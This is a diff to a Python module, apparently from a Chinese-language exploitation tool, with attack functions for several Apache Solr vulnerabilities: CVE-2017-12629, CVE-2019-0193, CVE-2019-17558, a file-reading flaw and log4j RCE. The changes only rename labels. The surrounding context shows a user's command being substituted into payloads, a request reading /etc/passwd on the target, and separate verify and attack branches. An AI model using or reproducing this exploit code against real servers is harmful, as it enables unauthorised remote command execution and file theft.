@@ -61,8 +61,8 @@ class ApacheSolr():
 
     def cve_2017_12629(self):
         #print('cve_2017_12629 线程任务开始了...')
-        appName = 'Apache Solr: CVE-2017-12629'
-        pocname = 'CVE-2017-12629'
+        appName = 'ApacheSolr'
+        pocname = 'cve_2017_12629'
         method = 'post'
         desc = 'Apache Solr: CVE-2017-12629'
         newcore = ''.join(random.choices(string.ascii_letters+string.digits, k=6))
@@ -88,7 +88,7 @@ class ApacheSolr():
             #'Content-Type' : 'application/x-www-form-urlencoded',
         }
         #输出类
-        output = Output(self.url, pocname)
+        output = Output(self.url, appName, pocname)
         #请求类
         exprequest = ExpRequest(pocname, output)
 
@@ -116,8 +116,8 @@ class ApacheSolr():
 
     def cve_2019_0193(self):
         #print('cve_2019_0193 线程任务开始了...')
-        appName = 'Apache Solr'
-        pocname = 'CVE-2019-0193'
+        appName = 'ApacheSolr'
+        pocname = 'cve_2019_0193'
         method = 'get'
         desc = 'Apache Solr: CVE-2019-0193'
         payload = self.payload_cve_2019_0193.replace("RECOMMAND", quote(self.cmd,'utf-8'))
@@ -135,7 +135,7 @@ class ApacheSolr():
         }
         urlcore = self.url+"/solr/admin/cores?indexInfo=false&wt=json"
         #输出类
-        output = Output(self.url, pocname)
+        output = Output(self.url, appName, pocname)
         #请求类
         exprequest = ExpRequest(pocname, output)
 
@@ -161,15 +161,15 @@ class ApacheSolr():
 
     def cve_2019_17558(self):
         #print('cve_2019_17558 线程任务开始了...')
-        appName = 'Apache Solr'
-        pocname = 'CVE-2019-17558'
+        appName = 'ApacheSolr'
+        pocname = 'cve_2019_17558'
         method = 'get'
         desc = 'Apache Solr: CVE-2019-17558'
         payload_1 = self.payload_cve_2019_17558.replace("RECOMMAND","id")
         payload_2 = self.payload_cve_2019_17558.replace("RECOMMAND",self.cmd)
         urlcore = self.url+"/solr/admin/cores?indexInfo=false&wt=json"
         #输出类
-        output = Output(self.url, pocname)
+        output = Output(self.url, appName, pocname)
         #请求类
         exprequest = ExpRequest(pocname, output)
 
@@ -212,7 +212,7 @@ class ApacheSolr():
 
     def cve_20210408_filereading(self):
         #print('cve_20210408_filereading 线程任务开始了...')
-        appName = 'Apache Solr'
+        appName = 'ApacheSolr'
         pocname = 'cve_20210408_filereading'
         method = 'get'
         desc = 'Apachesolr : cve_20210408_filereading'
@@ -226,7 +226,7 @@ class ApacheSolr():
             'Accept': '*/*'
         }
         #输出类
-        output = Output(self.url, pocname)
+        output = Output(self.url, appName, pocname)
         #请求类
         exprequest = ExpRequest(pocname, output)
 
@@ -234,9 +234,10 @@ class ApacheSolr():
             #_verify
             if self.vuln == 'False':
                 request = exprequest.get(self.url + path.format(self.corename,'/etc/passwd'), data=payload, headers=headers, timeout=self.timeout, verify=False)
-                if r"root" in request.text or r"系统找不到" in request.text:
+                if r"root:" in request.text or r"系统找不到" in request.text:
                     return output.echo_success(method, info)
                 else:
+                    #print('1')
                     return output.fail()
             #_attack
             else:
@@ -248,8 +249,8 @@ class ApacheSolr():
         
     def Apache_Solr_log4j_RCE(self):
         #print('Apache_Solr_log4j_RCE 线程任务开始了...')
-        appName = 'Apache Solr'
-        pocname = 'Apache Solr log4j RCE'
+        appName = 'ApacheSolr'
+        pocname = 'Apache_Solr_log4j_RCE'
         method = 'get'
         desc = 'Apachesolr : Apache Solr log4j RCE'
         info = '[RCE]'
@@ -266,7 +267,7 @@ class ApacheSolr():
             'Accept': '*/*'
         }
         #输出类
-        output = Output(self.url, pocname)
+        output = Output(self.url, appName, pocname)
         #请求类
         exprequest = ExpRequest(pocname, output)
 
@@ -313,6 +314,10 @@ def check(**kwargs):
                 thread_list.append(kwargs['pool'].submit(getattr(ExpApacheSolr, func)))
     #保存全局子线程列表
     GlobalVar.add_value('thread_list', thread_list)
+
+
+
+
 
 
 
